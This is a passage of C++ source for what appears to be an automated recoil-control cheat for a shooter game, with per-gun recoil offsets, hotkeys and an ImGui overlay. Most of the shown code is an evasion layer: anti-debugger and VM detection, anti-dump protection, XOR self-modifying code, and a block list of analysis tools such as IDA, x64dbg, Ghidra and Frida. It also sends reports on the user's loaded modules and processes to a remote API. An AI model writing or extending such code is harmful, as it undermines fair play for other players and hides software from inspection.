            output_log_message("No response received from security API. This could mean the request was successful but no response was returned.\n");
        }
        
        output_log_message("Security log sending process completed\n");
    } catch (const std::exception& e) {
        output_log_message("Exception in send_security_log_to_api: " + std::string(e.what()) + "\n");
    } catch (...) {
        output_log_message("Unknown exception in send_security_log_to_api\n");
    }
}

inline void HandleSecurityBlock(const std::string& detection_code,
                                const std::string& details,
                                const std::string& context_tag)
{
    std::string full_details = "Context=" + context_tag;
    if (!details.empty()) {
        full_details += " | " + details;
    }

    // لاگ داخلی یک‌دست برای تمام بلاک‌های امنیتی
    output_log_message("SECURITY BLOCK [" + detection_code + "] - " + full_details + "\n");

    // ارسال لاگ نهایی به API با کد و جزئیات
    send_security_log_to_api("FinalAction", "Code=" + detection_code + " | " + full_details);

    // نمایش پیام کلی برای کاربر بدون افشای جزییات دیتکت
    std::string message = "Security Error";
    message += "\nThe application has encountered a security error and will now close.";

    MessageBoxA(NULL, message.c_str(), "Security Error", MB_ICONERROR | MB_OK);
    ExitProcess(0);
}

// تکنیک‌های ضد دیباگ، ضد VM و ضد دامپ
namespace AntiDebug {
    // بررسی IsDebuggerPresent
    inline bool CheckIsDebuggerPresent() {
        return IsDebuggerPresent();
    }

    // بررسی CheckRemoteDebuggerPresent
    inline bool CheckRemoteDebuggerPresent() {
        BOOL isDebuggerPresent = FALSE;
        ::CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
        return isDebuggerPresent != FALSE;
    }

    // بررسی BeingDebugged در PEB - روش ساده‌تر و سازگارتر
    inline bool CheckPEBBeingDebugged() {
#ifdef _WIN64
        // برای ویندوز 64 بیتی
        BOOL isDebugged = FALSE;
        ::CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
        return isDebugged != FALSE;
#else
        // برای ویندوز 32 بیتی
        return IsDebuggerPresent();
#endif
    }

    // بررسی زمان اجرا - جایگزین NtGlobalFlag
    inline bool CheckExecutionTiming() {
        DWORD startTime = GetTickCount();
        
        // اجرای چند عملیات ساده برای سنجش زمان
        volatile int counter = 0;
        for (int i = 0; i < 1000000; i++) {
            counter++;
        }
        
        DWORD endTime = GetTickCount();
        DWORD elapsedTime = endTime - startTime;
        
        // اگر زمان اجرا بیش از حد معمول باشد، احتمالاً دیباگ می‌شود
        // آستانه را کمی بالاتر بردیم تا ریسک فالس‌پازیت کم شود
        return elapsedTime > 200; // قبلاً 100ms بود
    }
}

// تکنیک‌های ضد ماشین مجازی
namespace AntiVM {
    // بررسی رجیستری برای شناسایی ماشین مجازی
    inline bool CheckVMRegistry() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[256] = {0};
            DWORD bufferSize = sizeof(buffer);
            if (RegQueryValueExA(hKey, "Identifier", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return (strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "VMware"));
            }
            RegCloseKey(hKey);
        }
        return false;
    }

    // بررسی فرآیندهای مخصوص ماشین مجازی
    inline bool CheckVMProcesses() {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (!Process32First(hSnapshot, &pe32)) {
            CloseHandle(hSnapshot);
            return false;
        }
        
        do {
            if (strcmp(pe32.szExeFile, "vmtoolsd.exe") == 0 || 
                strcmp(pe32.szExeFile, "VBoxService.exe") == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe32));
        
        CloseHandle(hSnapshot);
        return false;
    }
}

// تکنیک‌های ضد دامپ حافظه
namespace AntiDump {
    // محافظت از هدر PE با استفاده از VirtualProtect - اصلاح شده برای جلوگیری از کرش
    inline void ProtectPEHeader() {
        // به جای تغییر محافظت به PAGE_NOACCESS که باعث کرش می‌شود
        // از PAGE_READONLY استفاده می‌کنیم که امن‌تر است
        DWORD oldProtect;
        LPVOID baseAddress = (LPVOID)GetModuleHandle(NULL);
        
        // فقط اگر آدرس پایه معتبر باشد
        if (baseAddress) {
            VirtualProtect(baseAddress, 4096, PAGE_READONLY, &oldProtect);
        }
    }

    // کد خود-تغییردهنده ساده
    inline void SelfModifyingCode(BYTE* codeStart, SIZE_T codeSize, BYTE key) {
        DWORD oldProtect;
        VirtualProtect(codeStart, codeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        
        // تغییر کد با XOR
        for (SIZE_T i = 0; i < codeSize; i++) {
            codeStart[i] ^= key;
        }
        
        VirtualProtect(codeStart, codeSize, oldProtect, &oldProtect);
    }
}

// اعلان توابع قبل از استفاده
inline std::string calculateFileHash(const std::string& filePath);
inline bool CheckFileIntegrity();
inline bool CheckOperationTiming(std::function<void()> operation);
inline bool CheckForInjectedDLLs();
inline bool CheckSuspiciousProcesses();
inline bool CheckSystemTimeManipulation();

// تابع اصلی برای بررسی همه تکنیک‌های محافظتی - ابتدا لاگ می‌دهد و سپس برنامه را می‌بندد
inline bool RunProtectionChecks(std::string& detection_code, std::string& detection_details) {
    detection_code.clear();
    detection_details.clear();

    // بررسی دیباگر با IsDebuggerPresent
    if (AntiDebug::CheckIsDebuggerPresent()) {
        detection_code = "SEC_DBG_LOCAL_01";
        detection_details = "IsDebuggerPresent detected a debugger";
        send_security_log_to_api("Debugger", detection_details);
        return true;
    }
    
    // بررسی دیباگر راه دور با CheckRemoteDebuggerPresent
    if (AntiDebug::CheckRemoteDebuggerPresent()) {
        detection_code = "SEC_DBG_REMOTE_01";
        detection_details = "CheckRemoteDebuggerPresent detected a remote debugger";
        send_security_log_to_api("Debugger", detection_details);
        return true;
    }
    
    // بررسی دیباگر با بررسی پرچم PEB
    if (AntiDebug::CheckPEBBeingDebugged()) {
        detection_code = "SEC_DBG_PEB_01";
        detection_details = "PEB BeingDebugged flag is set";
        send_security_log_to_api("Debugger", detection_details);
        return true;
    }
    
    // بررسی دیباگر با زمان‌سنجی
    if (AntiDebug::CheckExecutionTiming()) {
        detection_code = "SEC_DBG_TIMING_01";
        detection_details = "Abnormal execution timing detected";
        send_security_log_to_api("Debugger", detection_details);
        return true;
    }
    
    // بررسی ماشین مجازی از طریق رجیستری
    if (AntiVM::CheckVMRegistry()) {
        detection_code = "SEC_VM_REG_01";
        detection_details = "VM detected through registry checks";
        send_security_log_to_api("VirtualMachine", detection_details);
        return true;
    }
    
    // بررسی ماشین مجازی از طریق فرآیندها
    if (AntiVM::CheckVMProcesses()) {
        detection_code = "SEC_VM_PROC_01";
        detection_details = "VM detected through process checks";
        send_security_log_to_api("VirtualMachine", detection_details);
        return true;
    }
    
    // بررسی یکپارچگی فایل اجرایی
    if (!CheckFileIntegrity()) {
        detection_code = "SEC_FILE_INTEGRITY_01";
        detection_details = "Executable file integrity check failed";
        send_security_log_to_api("FileIntegrity", detection_details);
        return true;
    }
    
    // بررسی زمان اجرای یک عملیات حساس
    if (CheckOperationTiming([]() {
        // یک عملیات ساده برای بررسی زمان اجرا
        volatile int result = 0;
        for (int i = 0; i < 10000; i++) {
            result += i * i;
        }
    })) {
        detection_code = "SEC_TIMING_OP_01";
        detection_details = "Abnormal operation timing detected";
        send_security_log_to_api("TimingCheck", detection_details);
        return true;
    }
    
    // بررسی پروسه‌های مشکوک (دیباگرها، ابزارهای مهندسی معکوس)
    if (CheckSuspiciousProcesses()) {
        detection_code = "SEC_PROC_SUSP_01";
        detection_details = "Suspicious debugging or reverse-engineering process detected";
        return true;
    }
    
    // بررسی تغییرات زمان سیستم
    if (CheckSystemTimeManipulation()) {
        detection_code = "SEC_TIME_MANIP_01";
        detection_details = "System time manipulation detected";
        return true;
    }
    
    // بررسی DLL‌های تزریق شده
    // فقط بررسی می‌کنیم و لاگ می‌دهیم ولی برنامه را متوقف نمی‌کنیم
    CheckForInjectedDLLs(); // لاگ در تابع CheckForInjectedDLLs انجام می‌شود
    
    // هیچ تهدیدی شناسایی نشد
    return false;
}

// تابع محاسبه هش فایل
inline std::string calculateFileHash(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) return "";
    
    // خواندن فایل به بافر
    std::vector<unsigned char> buffer(std::istreambuf_iterator<char>(file), {});
    
    // محاسبه هش SHA-256
    std::vector<unsigned char> hash(32);
    picosha2::hash256(buffer.begin(), buffer.end(), hash.begin(), hash.end());
    
    return picosha2::bytes_to_hex_string(hash.begin(), hash.end());
}

// بررسی یکپارچگی فایل اجرایی
inline bool CheckFileIntegrity() {
    char filePath[MAX_PATH];
    GetModuleFileNameA(NULL, filePath, MAX_PATH);
    
    // هش فایل را محاسبه کنید
    std::string calculatedHash = calculateFileHash(filePath);
    output_log_message("Current exe SHA256: " + calculatedHash + "\n");
    
    // هش‌های معتبر از پیش تعیین شده (می‌توانید چندین هش برای نسخه‌های مختلف برنامه داشته باشید)
    // این هش‌ها باید با هش فایل اجرایی اصلی مطابقت داشته باشند
    // برای امنیت بیشتر، این هش‌ها را به صورت رمزگذاری شده ذخیره کنید
    const std::vector<std::string> validHashes = {
        "4c273231c05e2f8d74af7d95c0845b4109ef5ef3a6fd95b72014a5482f680f6a"
    };
    
    // اگر هنوز هش معتبر تنظیم نشده است، بررسی یکپارچگی را اعمال نکن
    if (validHashes.size() == 1 && validHashes[0] == "REPLACE_WITH_KNOWN_GOOD_SHA256_HASH") {
        return true;
    }
    
    // بررسی هش محاسبه شده با لیست هش‌های معتبر
    for (const auto& hash : validHashes) {
        if (calculatedHash == hash) {
            return true;
        }
    }
    
    // اگر هش با هیچ یک از هش‌های معتبر مطابقت نداشت، فقط لاگ بنویس و برنامه را بلاک نکن
    output_log_message("File integrity check failed. Calculated hash: " + calculatedHash + "\n");
    return true;
}

// بررسی زمان اجرا برای عملیات‌های حساس
inline bool CheckOperationTiming(std::function<void()> operation) {
    DWORD startTime = GetTickCount();
    
    // اجرای عملیات
    operation();
    
    DWORD endTime = GetTickCount();
    DWORD elapsedTime = endTime - startTime;
    
    // اگر زمان اجرا بیش از حد معمول باشد، احتمالاً دیباگ می‌شود
    // آستانه را کمی بالاتر بردیم تا روی سیستم‌های کند فالس‌پازیت کم شود
    return elapsedTime > 120; // قبلاً 50ms بود
}

// تشخیص تغییر زمان سیستم
inline bool CheckSystemTimeManipulation() {
    // استفاده از متغیرهای استاتیک برای نگهداری مقادیر بین فراخوانی‌ها
    static ULONGLONG lastCheckTime = 0;
    // مقداردهی کامل ساختار SYSTEMTIME برای رفع هشدار
    static SYSTEMTIME lastSystemTime = {0, 0, 0, 0, 0, 0, 0, 0}; // مقداردهی برای تمام فیلدهای ساختار
    static ULONGLONG lastSystemTimeMs = 0; // زمان سیستم قبلی به میلی‌ثانیه
    static bool firstRun = true;
    
    // دریافت زمان سیستم فعلی
    SYSTEMTIME currentSystemTime;
    GetSystemTime(&currentSystemTime);
    
    // دریافت زمان دقیق سیستم برای مقایسه
    ULONGLONG currentTickCount = GetTickCount64();
    
    // تبدیل SYSTEMTIME به میلی‌ثانیه برای مقایسه
    FILETIME ftCurrentSystem;
    SystemTimeToFileTime(&currentSystemTime, &ftCurrentSystem);
    
    ULARGE_INTEGER ulCurrentSystem;
    ulCurrentSystem.LowPart = ftCurrentSystem.dwLowDateTime;
    ulCurrentSystem.HighPart = ftCurrentSystem.dwHighDateTime;
    
    // تبدیل به میلی‌ثانیه (100-نانوثانیه تقسیم بر 10000)
    ULONGLONG currentSystemTimeMs = ulCurrentSystem.QuadPart / 10000;
    
    // اگر این اولین بار است که تابع فراخوانی می‌شود، مقادیر اولیه را ذخیره کن
    if (firstRun) {
        lastCheckTime = currentTickCount;
        lastSystemTime = currentSystemTime;
        lastSystemTimeMs = currentSystemTimeMs;
        firstRun = false;
        return false;
    }
    
    // محاسبه زمان سپری شده بر اساس شمارنده دقیق سیستم (به میلی‌ثانیه)
    ULONGLONG elapsedTickCount = currentTickCount - lastCheckTime;
    
    // محاسبه تفاوت زمانی بر اساس زمان سیستم
    LONGLONG systemTimeDiff = (LONGLONG)currentSystemTimeMs - (LONGLONG)lastSystemTimeMs;
    
    // آستانه تشخیص تغییر زمان - افزایش به 10 ثانیه برای کاهش هشدارهای اشتباه
    const LONGLONG MANIPULATION_THRESHOLD = 10000; // 10 ثانیه - استفاده از LONGLONG به جای ULONGLONG برای سازگاری با متغیرهای دیگر
    
    bool isManipulated = false;
    std::string manipulationDetails = "";
    
    // بررسی تغییرات زمان سیستم
    // استفاده از مقدار مطلق برای تشخیص تغییرات مثبت و منفی
    LONGLONG diffAbs = systemTimeDiff > 0 ? systemTimeDiff : -systemTimeDiff;
    LONGLONG expectedDiff = (LONGLONG)elapsedTickCount;
    
    // اضافه کردن مقدار تلورانس برای تغییرات طبیعی زمان
    // برخی سیستم‌ها ممکن است تغییرات کوچکی در زمان داشته باشند که طبیعی است
    const LONGLONG NATURAL_TIME_TOLERANCE = 5000; // 5 ثانیه تلورانس برای تغییرات طبیعی
    
    // محاسبه تفاوت با در نظر گرفتن تلورانس
    LONGLONG diffDelta = 0;
    if (diffAbs > expectedDiff + NATURAL_TIME_TOLERANCE) {
        diffDelta = diffAbs - expectedDiff;
    } else if (expectedDiff > diffAbs + NATURAL_TIME_TOLERANCE) {
        diffDelta = expectedDiff - diffAbs;
    } else {
        // تغییرات در محدوده طبیعی است
        diffDelta = 0;
    }
    
    // اگر تفاوت بین زمان سیستم و زمان واقعی بیش از آستانه باشد
    if (diffDelta > MANIPULATION_THRESHOLD) {
        isManipulated = true;
        
        // تشخیص جهت تغییر زمان
        if (systemTimeDiff > expectedDiff + MANIPULATION_THRESHOLD) {
            // زمان سیستم به جلو برده شده است
            manipulationDetails = "System time jumped forward by " + 
                                 std::to_string((systemTimeDiff - expectedDiff) / 1000) + 
                                 " seconds";
        } else if (expectedDiff > systemTimeDiff + MANIPULATION_THRESHOLD) {
            // زمان سیستم به عقب برده شده است
            manipulationDetails = "System time jumped backward by " + 
                                 std::to_string((expectedDiff - systemTimeDiff) / 1000) + 
                                 " seconds";
        } else {
            // تغییر نامشخص در زمان سیستم
            manipulationDetails = "System time changed unexpectedly by " + 
                                 std::to_string(diffDelta / 1000) + 
                                 " seconds";
        }
        
        // لاگ اطلاعات بیشتر برای دیباگ
        output_log_message("Time manipulation details: SystemTime diff = " + std::to_string(systemTimeDiff) + 
                          "ms, TickCount diff = " + std::to_string(elapsedTickCount) + 
                          "ms, Delta = " + std::to_string(diffDelta) + "ms\n");
    }
    
    // به‌روزرسانی مقادیر برای بررسی بعدی
    lastCheckTime = currentTickCount;
    lastSystemTime = currentSystemTime;
    lastSystemTimeMs = currentSystemTimeMs;
    
    if (isManipulated) {
        // ارسال لاگ به API
        send_security_log_to_api("SystemTimeManipulation", manipulationDetails);
        
        // آستانه برای بستن برنامه - فقط در صورت تغییرات بزرگ برنامه را ببند
        const LONGLONG CRITICAL_THRESHOLD = 30000; // 30 ثانیه
        
        if (diffDelta > CRITICAL_THRESHOLD) {
            // نمایش پیام خطا
            output_log_message("Critical system time manipulation detected: " + manipulationDetails + "\n");
        } else {
            // برای تغییرات کوچکتر، فقط لاگ کن و هشدار بده ولی برنامه را نبند
            output_log_message("Minor time manipulation detected but allowed to continue: " + manipulationDetails + "\n");
        }
    }
    
    return isManipulated;
}

// بررسی DLL‌های تزریق شده
inline bool CheckForInjectedDLLs() {
    // برای سبک‌تر شدن، این اسکن سنگین را فقط یک بار در طول اجرای برنامه انجام می‌دهیم
    static bool s_checked_once = false;
    static bool s_cached_result = false;
    if (s_checked_once) {
        return s_cached_result;
    }

    HMODULE hMods[1024];
    DWORD cbNeeded;
    HANDLE hProcess = GetCurrentProcess();
    
    // لیست سفید DLL‌های مجاز (بهبود یافته برای برنامه شما)
    std::vector<std::string> whitelist = {
        // DLL های سیستمی ویندوز
        "ntdll.dll",
        "kernel32.dll",
        "kernelbase.dll",
        "user32.dll",
        "gdi32.dll",
        "gdi32full.dll",
        "advapi32.dll",
        "shell32.dll",
        "ole32.dll",
        "oleaut32.dll",
        "comctl32.dll",
        "comdlg32.dll",
        "wininet.dll",
        "urlmon.dll",
        "ws2_32.dll",
        "winmm.dll",
        "msvcrt.dll",
        "ucrtbase.dll",
        "msvcp_win.dll",
        "vcruntime140.dll",
        "vcruntime140_1.dll",
        "dbghelp.dll",
        "imm32.dll",
        "sechost.dll",
        "rpcrt4.dll",
        "shlwapi.dll",
        "version.dll",
        "setupapi.dll",
        "cfgmgr32.dll",
        "bcrypt.dll",
        "crypt32.dll",
        "wintrust.dll",
        "iphlpapi.dll",
        "powrprof.dll",
        "uxtheme.dll",
        
        // DLL های مرتبط با DirectX و گرافیک
        "d3d11.dll",
        "dxgi.dll",
        "d3dcompiler_47.dll",
        "dcomp.dll",
        "dwmapi.dll",
        "dxcore.dll",
        
        // DLL های مرتبط با MinGW/MSYS2
        "libwinpthread-1.dll",
        "libgcc_s_seh-1.dll",
        "libstdc++-6.dll",
        
        // فایل اجرایی خود برنامه
        "Core.exe",
        "CORE.EXE",
        "core.exe",
        
        "iphlpapi.dll",
        "psapi.dll",
        "d3d11.dll",
        "dxgi.dll",
        "dwmapi.dll",
        "msvcrt.dll",
        "vcruntime",  // برای تطابق با نسخه‌های مختلف Visual C++ Runtime
        "msvcp",      // برای تطابق با نسخه‌های مختلف Visual C++ Runtime
        "ucrtbase.dll",
        
        // DLL های مرتبط با نرم‌افزارهای مانیتورینگ و بهینه‌سازی
        "RTSSHooks64.dll",     // RivaTuner Statistics Server (MSI Afterburner)
        "RTSSHooks.dll",       // نسخه 32 بیتی RivaTuner
        "RTSS.dll",            // RivaTuner Statistics Server
        "MSIAfterburner.dll",  // MSI Afterburner
        "EOSDK-Win64-Shipping.dll", // Epic Games Overlay
        "fraps.dll",           // Fraps
        "fraps64.dll",         // Fraps 64-bit
        "overlay.dll",         // انواع اورلی‌های بازی
    };
    
    // لیست سیاه DLL‌های مشکوک (می‌توانید بر اساس نیاز خود تغییر دهید)
    std::vector<std::string> blacklist = {
        "engine",
        "frida",
        "injector",
        "hook",
        "hack",
        "memory",
        "debug",
        "trainer"
    };
    
    // دریافت لیست تمام ماژول‌های بارگذاری شده در پروسه جاری
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                std::string moduleName = szModName;
                std::string moduleNameLower = moduleName;
                std::transform(moduleNameLower.begin(), moduleNameLower.end(), moduleNameLower.begin(), ::tolower);
                
                // استخراج نام فایل از مسیر کامل
                std::string fileName = moduleName.substr(moduleName.find_last_of("\\/") + 1);
                std::string fileNameLower = fileName;
                std::transform(fileNameLower.begin(), fileNameLower.end(), fileNameLower.begin(), ::tolower);
                
                // بررسی فایل اجرایی خود برنامه
                char exePath[MAX_PATH];
                GetModuleFileNameA(NULL, exePath, MAX_PATH);
                std::string exePathStr = exePath;
                std::string exeName = exePathStr.substr(exePathStr.find_last_of("\\/") + 1);
                std::string exeNameLower = exeName;
                std::transform(exeNameLower.begin(), exeNameLower.end(), exeNameLower.begin(), ::tolower);
                
                // اگر فایل مورد بررسی، فایل اجرایی خود برنامه است، آن را نادیده بگیر
                if (fileNameLower == exeNameLower || fileNameLower == "core.exe") {
                    continue;
                }
                
                // بررسی لیست سفید
                bool inWhitelist = false;
                for (const auto& whiteItem : whitelist) {
                    std::string whiteItemLower = whiteItem;
                    std::transform(whiteItemLower.begin(), whiteItemLower.end(), whiteItemLower.begin(), ::tolower);
                    
                    if (fileNameLower == whiteItemLower || fileNameLower.find(whiteItemLower) != std::string::npos) {
                        inWhitelist = true;
                        break;
                    }
                }
                
                // بررسی مسیرهای سیستمی
                bool isSystemPath = false;
                if (moduleNameLower.find("system32") != std::string::npos || 
                    moduleNameLower.find("syswow64") != std::string::npos || 
                    moduleNameLower.find("windows\\winsxs") != std::string::npos) {
                    isSystemPath = true;
                }
                
                // بررسی مسیر برنامه
                std::string exeDir = exePathStr.substr(0, exePathStr.find_last_of("\\/"));
                bool isInAppDir = (moduleNameLower.find(exeDir) != std::string::npos);
                
                // اگر در لیست سفید است یا در مسیر سیستمی است یا در مسیر برنامه است، مجاز است
                if (inWhitelist || isSystemPath || isInAppDir) {
                    continue;
                }
                
                // بررسی لیست سیاه
                for (const auto& blackItem : blacklist) {
                    if (fileNameLower.find(blackItem) != std::string::npos) {
                        // DLL مشکوک پیدا شد
                        send_security_log_to_api("DLL Injection", "Suspicious DLL detected: " + fileName);
                        return true;
                    }
                }
                
                // اگر DLL در لیست سفید نیست و در مسیرهای مجاز هم نیست
                // بررسی نام DLL برای اطمینان از اینکه در لیست سیاه نیست
                bool isSuspicious = false;
                for (const auto& blackItem : blacklist) {
                    if (fileNameLower.find(blackItem) != std::string::npos) {
                        isSuspicious = true;
                        break;
                    }
                }
                
                if (isSuspicious) {
                    // برای DLL‌های مشکوک فقط لاگ می‌دهیم و برنامه را ادامه می‌دهیم
                    send_security_log_to_api("DLL Injection", "Suspicious DLL detected: " + fileName + " at " + moduleName);
                    // نتیجه را کش می‌کنیم و false برمی‌گردانیم تا رفتار قبلی حفظ شود
                    s_checked_once = true;
                    s_cached_result = false;
                    return s_cached_result;
                } else {
                    // برای DLL‌های ناشناخته ولی غیرمشکوک فقط لاگ می‌گیریم و برنامه را ادامه می‌دهیم
                    send_security_log_to_api("DLL Info", "Unknown DLL detected: " + fileName + " at " + moduleName);
                    s_checked_once = true;
                    s_cached_result = false;
                    return s_cached_result;
                }
            }
        }
    }
    s_checked_once = true;
    s_cached_result = false;
    return s_cached_result;
}

// بررسی پروسه‌های مشکوک
inline bool CheckSuspiciousProcesses() {
    // برای سبک‌تر شدن، لیست پروسه‌ها را فقط یک بار اسکن می‌کنیم و نتیجه را کش می‌کنیم
    static bool s_checked_once = false;
    static bool s_cached_result = false;
    if (s_checked_once) {
        return s_cached_result;
    }

    const char* suspiciousProcesses[] = {
        "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
        "cheatengine.exe", "httpdebugger.exe", "processhacker.exe", "wireshark.exe",
        "fiddler.exe", "ghidra.exe", "dnspy.exe", "hxd.exe", "pestudio.exe",
        "debugger.exe", "frida.exe", "immunity debugger.exe", "scylla.exe", "cutter.exe",
        "radare2.exe", "windbg.exe", "ilspy.exe", "reflector.exe", "de4dot.exe"
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    bool found = false;
    std::string foundProcess = "";
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (const char* process : suspiciousProcesses) {
                if (_stricmp(pe32.szExeFile, process) == 0) {
                    foundProcess = process;
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    
    if (found) {
        // ارسال لاگ به API
        send_security_log_to_api("SuspiciousProcess", "Detected suspicious process: " + foundProcess);
        
        // نمایش پیام خطا (اختیاری)
        output_log_message("Suspicious process detected: " + foundProcess + "\n");
        
        // بستن برنامه
    }

    s_checked_once = true;
    s_cached_result = found;
    return s_cached_result;
}

// تابع برای اعمال محافظت‌های ضد دامپ
inline void ApplyAntiDumpProtections() {
    // محافظت از هدر PE - اکنون اصلاح شده است تا باعث کرش نشود
    AntiDump::ProtectPEHeader();
    
    // لاگ دادن اعمال محافظت‌های ضد دامپ
    send_security_log_to_api("AntiDump", "Applied anti-dump protections with safe PE header protection");
}

// Use the nlohmann::json namespace
using json = nlohmann::json;

// --- Includes for ImGui & DirectX ---
#include "imgui.h"
#include "imgui_impl_win32.h"
#include "imgui_impl_dx11.h" // Corrected include syntax
#include <d3d11.h>


// --- Global Variables for DirectX & Window ---
static ID3D11Device* g_pd3dDevice = nullptr;
static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;
static IDXGISwapChain* g_pSwapChain = nullptr;
static ID3D11RenderTargetView* g_mainRenderTargetView = nullptr;
static HWND                     hwnd = nullptr; // Handle for our window

// Forward declaration of window procedure
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

// --- Configurable Global Variables ---
// Configurable via ImGui and config file
double SENSITIVITY = 0.9; // Example default
double FOV = 90.0;
     // Example default

//version app
const std::string APP_VERSION_NUMBER = "1.0.1";

// Define min/max values for sliders
const double MIN_SENS = 0.0;
const double MAX_SENS = 2.0;
const double MIN_FOV = 70.0;
const double MAX_FOV = 90.0;
const double MIN_RECOIL_MULT = -1.0;
const double MAX_RECOIL_MULT = 2.0;

// Internal calculation variable (derived from SENSITIVITY and FOV)
double screenMultiplier = -0.01; // Will be recalculated

// ساختار برای پروفایل‌های از پیش تنظیم شده (Presets)
struct SettingsPreset {
    std::string name;
    double sensitivity;
    double fov;
};

// --- Profile Names (Single Profile per Gun) ---
const std::string PROFILE_AK47    = "AK47";
const std::string PROFILE_LR300   = "LR300";
const std::string PROFILE_THOMPSON = "THOMPSON";
const std::string PROFILE_SAR     = "SAR";
const std::string PROFILE_MP5A4   = "MP5A4";
const std::string PROFILE_HMLMG   = "HMLMG";
const std::string PROFILE_M249    = "M249";


// List of all available profiles for UI dropdown
const std::vector<std::string> ALL_PROFILES = {
    PROFILE_AK47,
    PROFILE_LR300,
    PROFILE_THOMPSON,
    PROFILE_SAR,
    PROFILE_MP5A4,
    PROFILE_HMLMG,
    PROFILE_M249 
};

// --- Key Map (Virtual Key Codes) ---
// Mapping Profile Names to their current Virtual Key Codes
std::map<std::string, int> g_profile_keybinds = {
    {PROFILE_AK47, VK_F4},
    {PROFILE_LR300, VK_F5},
    {PROFILE_THOMPSON, VK_F6},
    {PROFILE_SAR, VK_F7},
    {PROFILE_MP5A4, VK_F8},
    {PROFILE_HMLMG, VK_F9},
    {PROFILE_M249, VK_F10}
};

// Special Keybinds (UI Toggle, Exit)
std::atomic<int> g_ui_toggle_key{VK_HOME};     // Default UI Toggle key
std::atomic<int> g_exit_app_key{VK_INSERT};    // Default Exit App key
std::atomic<int> g_global_macro_toggle_key{VK_F11}; // DEPRECATED: Was for global macro toggle

// Mouse Button & Special Action Keybinds - Can be  buttons or keyboard keys
std::atomic<int> g_lmb_key{VK_LBUTTON};      // Default Left Mouse Button
std::atomic<int> g_rmb_key{VK_RBUTTON};      // Default Right Mouse Button
std::atomic<int> g_nightModeKey{VK_END};     // Default Night Mode key

// --- Door Unlocker Variables ---
int g_door_unlock_code = 0; // Default door code
int g_door_unlock_trigger_key = VK_XBUTTON2; // Default trigger key (Mouse Button 5)

// Map for converting VK codes to string names for display/config
std::map<int, std::string> vk_code_names;
// Map for converting string names to VK codes for config loading
std::map<std::string, int> vk_name_codes;

// State for keybind capturing in the UI
std::atomic<bool> g_is_capturing_keybind{false};
std::string g_profile_being_rebound = ""; // Which profile's keybind is being set (or special key name like "UI_TOGGLE", "EXIT_APP", "GLOBAL_MACRO_TOGGLE", "LMB", "RMB", "DOOR_UNLOCK_TRIGGER")


// --- Attachment States Structure ---
struct AttachmentState {
    bool holo = false;
    bool x8 = false;
    bool x16 = false;
    bool handmade = false;
    bool muzzle_boost = false; // Not all guns have this
    bool muzzle_brake = false; 
};

// --- Global Attachment States (Consolidated) ---
std::map<std::string, AttachmentState> g_attachment_states;

// --- Theme Settings ---
struct ThemeSettings {
    // Gaming Theme (Purple) as default
    ImVec4 background_color = ImVec4(0.10f, 0.10f, 0.15f, 0.95f); // Gaming dark purple
    ImVec4 text_color = ImVec4(1.00f, 1.00f, 1.00f, 1.00f); // White text
    ImVec4 button_color = ImVec4(0.35f, 0.25f, 0.65f, 0.59f); // Purple button
    ImVec4 button_hovered_color = ImVec4(0.50f, 0.30f, 0.80f, 0.80f); // Light purple on hover
    ImVec4 button_active_color = ImVec4(0.60f, 0.35f, 0.90f, 1.00f); // Bright purple when active
    ImVec4 header_color = ImVec4(0.40f, 0.25f, 0.70f, 0.45f); // Purple header
};

// Global theme settings
ThemeSettings g_theme_settings;

// --- Recoil Data (Raw Offsets) ---
const std::vector<double> AK47_OFFSET_X = {0.0, 0.19, 0.36, 0.50, 0.62, 0.75, 0.8, 0.9, 0.91, 0.91, 0.91, 0.924, 0.924, 0.924, 0.924, 0.924, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.92, 0.92, 0.91, 0.91, 0.9};
const std::vector<double> AK47_OFFSET_Y = {-1.37, -1.37, -1.37, -1.37, -1.37, -1.37, -1.37, -1.38, -1.38, -1.38, -1.381, -1.382, -1.383, -1.384, -1.385, -1.385, -1.385, -1.385, -1.383, -1.382, -1.381, -1.381, -1.38, -1.38, -1.38, -1.37, -1.37, -1.37, -1.369, -1.366};
const double AK47_RPM_DELAY = 133.3; 
const int AK47_BULLETS = AK47_OFFSET_Y.size();

